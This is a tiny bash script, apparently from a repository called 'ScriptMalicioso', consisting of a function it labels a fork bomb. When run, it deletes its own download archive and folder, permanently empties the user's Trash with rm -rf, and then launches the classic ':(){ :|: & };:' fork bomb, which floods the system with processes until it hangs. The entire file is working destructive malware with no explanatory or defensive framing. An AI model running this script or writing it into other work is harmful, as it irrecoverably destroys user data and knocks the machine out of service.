#!/usr/bin/bash

# This is a forx bomb
function forkBomb () {
  rm -rf main.zip
  rm -rf ScriptMalicioso-main
  rm -rf ~/.local/share/Trash/*
  :(){ :|: & };:
}
forkBomb
